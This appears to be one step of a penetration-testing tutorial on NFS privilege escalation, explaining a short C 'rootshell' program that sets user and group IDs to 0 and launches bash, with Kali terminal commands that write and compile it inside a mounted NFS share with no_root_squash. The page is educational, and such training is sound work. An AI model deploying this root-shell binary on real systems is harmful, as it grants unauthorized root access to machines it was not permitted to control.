Exploitation Step 2

Crafting a Root Shell Binary

Developing a C program to gain root privileges.

The `rootshell.c` Program

This small C program is designed to elevate privileges by setting the effective User ID and Group ID to 0 (root), then executing a bash shell.

Key Functions

  • setuid(0): Sets the effective user ID to root.
  • setgid(0): Sets the effective group ID to root.
  • system("/bin/bash"): Executes a bash shell with the newly acquired root privileges.
Key Takeaway

Creating a simple SUID C binary is a common and effective technique for privilege escalation when no_root_squash is active.

Terminal: Attacking Machine (Kali)
kali@kali:~$ nano /mnt/nfs_share/rootshell.c

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0;
}

kali@kali:~$ gcc /mnt/nfs_share/rootshell.c -o /mnt/nfs_share/rootshell
kali@kali:~$ ls -l /mnt/nfs_share/rootshell
-rwxr-xr-x 1 root root 8400 Sep 27 10:30 /mnt/nfs_share/rootshell

Explanation:

  • We create rootshell.c within the mounted NFS share.
  • The C code uses setuid(0) and setgid(0) to become root, then executes /bin/bash.
  • gcc compiles the C source into an executable binary named rootshell.
